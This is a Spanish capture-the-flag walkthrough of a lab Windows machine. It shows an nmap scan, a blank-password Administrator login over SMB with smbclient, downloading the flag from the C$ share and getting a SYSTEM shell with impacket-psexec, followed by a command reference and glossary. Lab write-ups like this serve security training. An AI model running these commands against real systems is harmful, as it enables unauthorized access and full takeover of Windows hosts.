// 01

Reconocimiento

1
ESCANEO DIRIGIDO A SMB

La descripción de la máquina ya apunta a comparticiones SMB mal configuradas, así que el escaneo se centra en los puertos típicos de SMB y RDP en vez de un -p- completo.

BASH
$ sudo nmap -Pn -sT -p139,445,3389 10.129.5.89
PORT STATE SERVICE
139/tcp open netbios-ssn
445/tcp open microsoft-ds
3389/tcp filtered ms-wbt-server

// NOTA

-Pn porque el host no responde a ping, y -sT (escaneo TCP connect) porque esta máquina se trabajó sobre un pivote sin privilegios para el escaneo SYN. El 3389 queda filtrado: RDP no es el camino. Solo SMB (139/445) está realmente accesible.

// 02

SMB sin contraseña

2
LISTAR RECURSOS COMO ADMINISTRATOR

La pista de la descripción es directa: probar Administrator con contraseña vacía. En smbclient eso se escribe con el usuario seguido de % y nada después.

SMBCLIENT
$ smbclient -L //10.129.5.89/ -U 'Administrator%'
Sharename Type Comment
--------- ---- -------
ADMIN$ Disk Remote Admin
C$ Disk Default share
IPC$ IPC Remote IPC

// CUENTA ADMINISTRATIVA SIN CONTRASEÑA

Dónde: autenticación SMB de Administrator con contraseña vacía.
Qué permite: acceso a los shares administrativos por defecto (ADMIN$, C$) — el disco C: completo, sin exploit ni escalada.

// OJO

smbclient -L //IP/ -N -U Administrator (login anónimo) devuelve NT_STATUS_LOGON_FAILURE. La forma correcta es -U 'Administrator%': el % le dice al cliente que la contraseña es una cadena vacía, no que falta especificarla.

3
LOCALIZAR Y DESCARGAR LA FLAG
SMBCLIENT
$ smbclient "//10.129.5.89/C\$" -U 'Administrator%' -c 'dir Users\Administrator\Desktop'
. D 0 Thu Oct 22 09:11:04 2026
.. D 0 Thu Oct 22 09:11:04 2026
flag.txt A 32 Thu Oct 22 09:11:04 2026
FLAG
$ smbclient "//10.129.5.89/C\$" -U 'Administrator%' -c 'get Users\Administrator\Desktop\flag.txt /tmp/tc_flag.txt'
$ cat /tmp/tc_flag.txt
[flag oculta]

// FLAG

[flag oculta] — leída por SMB en C:\Users\Administrator\Desktop\flag.txt, sin necesitar una shell interactiva. Tiempo total: ~15 minutos.

4
ALTERNATIVA: SHELL SYSTEM

Con la misma cuenta, impacket-psexec abre un servicio remoto temporal y entrega una shell interactiva como NT AUTHORITY\SYSTEM — útil si en vez de una flag concreta se necesita ejecutar comandos:

IMPACKET
$ impacket-psexec Administrator@10.129.5.89
Password: [Enter, vacío]
[*] Requesting shares on 10.129.5.89.....
[*] Uploading file ...
[*] Starting service ...
Microsoft Windows [Version ...]
C:\Windows\system32> whoami
nt authority\system

// 03

Referencia Comandos

nmap
sudo nmap -Pn -sT -p139,445,3389 <IP>
Escaneo dirigido a los puertos de SMB y RDP cuando ya se sospecha el vector.
  • -Pn → No hace ping previo; trata el host como activo.
  • -sT → Escaneo TCP connect (completo), útil sin privilegios RAW.
  • -p → Lista explícita de puertos a comprobar.
smbclient -L
smbclient -L //<IP>/ -U 'usuario%'
Lista los recursos compartidos (shares) disponibles con unas credenciales dadas.
  • -L → Modo listado de shares.
  • -U 'user%' → Usuario con contraseña vacía (el % la fija como cadena vacía).
smbclient -c
smbclient "//IP/C$" -U 'user%' -c 'dir ruta' / '-c get ruta destino'
Ejecuta un comando SMB puntual (navegar o descargar) sin entrar al modo interactivo.
  • C\$ → El $ se escapa en bash para no interpretarse como variable.
  • -c → Comando SMB a ejecutar (dir, get, put...).
impacket-psexec
impacket-psexec usuario@IP
Despliega un servicio temporal vía SMB/RPC y abre una shell SYSTEM si la cuenta tiene privilegios administrativos.

// 04

Glosario

SMB
Protocolo de Windows para compartir archivos, impresoras y recursos en red (puertos 139/445). Es uno de los servicios más atacados en máquinas Windows por su variedad de configuraciones inseguras.
Recursos administrativos (C$, ADMIN$)
Shares ocultos que Windows crea por defecto y que dan acceso al disco completo (C$) o a la carpeta de instalación (ADMIN$). Solo deberían ser accesibles para administradores autenticados.
smbclient
Cliente de línea de comandos de Samba para listar, navegar y transferir archivos contra un servidor SMB, tanto en modo interactivo como con comandos sueltos (-c).
Contraseña vacía (NULL/blank password)
Cuenta válida sin ninguna contraseña asignada. Muchos clientes la representan con -U 'usuario%' (nada tras el %), distinto de no enviar credenciales en absoluto.
impacket-psexec
Reimplementación en Python del PsExec de Sysinternals: sube un ejecutable temporal, lo registra como servicio y abre una shell con los privilegios de la cuenta usada para autenticarse.
NT_STATUS_LOGON_FAILURE
Error de SMB cuando las credenciales no son válidas para el tipo de autenticación solicitado. Un login anónimo (-N) y uno con contraseña vacía (usuario%) no son lo mismo para el servidor.
